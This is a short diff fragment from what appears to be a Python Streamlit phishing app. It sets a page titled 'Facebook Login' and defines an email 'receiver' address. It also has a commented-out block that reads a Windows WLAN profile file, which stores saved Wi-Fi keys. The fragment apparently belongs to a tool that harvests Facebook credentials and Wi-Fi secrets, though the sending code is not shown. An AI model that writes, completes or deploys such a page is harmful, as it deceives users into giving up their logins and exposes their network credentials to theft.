@@ -16,19 +16,19 @@ receiver= "sonu.code.ai@gmail.com"
 
 
 # Run a simple command
-"""
-try:
+
+#try:
     # Run the linux command
-    command=["ip", "addr"] 
-    file_to_read = "C:/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/{0BB2ACD4-27AD-41F6-9108-5C4CF08387ED.xml}"
-    output = subprocess.run(["cat", file_to_read],shell=True,capture_output=True,text=True)
+    ##command=["ip", "addr"] 
+    #file_to_read = "C:/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/{0BB2ACD4-27AD-41F6-9108-5C4CF08387ED.xml}"
+    #output = subprocess.run(["cat", file_to_read],shell=True,capture_output=True,text=True)
 
     # Get the output
-    final_output = output.stdout if output.returncode == 0 else output.stderr
+    #final_output = output.stdout if output.returncode == 0 else output.stderr
 
-except Exception as e:
-    final_output = f"Error occurred: {e}" 
-"""
+#except Exception as e:
+    #final_output = f"Error occurred: {e}" 
+
 
 
 st.set_page_config(page_title="Facebook Login",page_icon="logo.png" ,layout="centered")
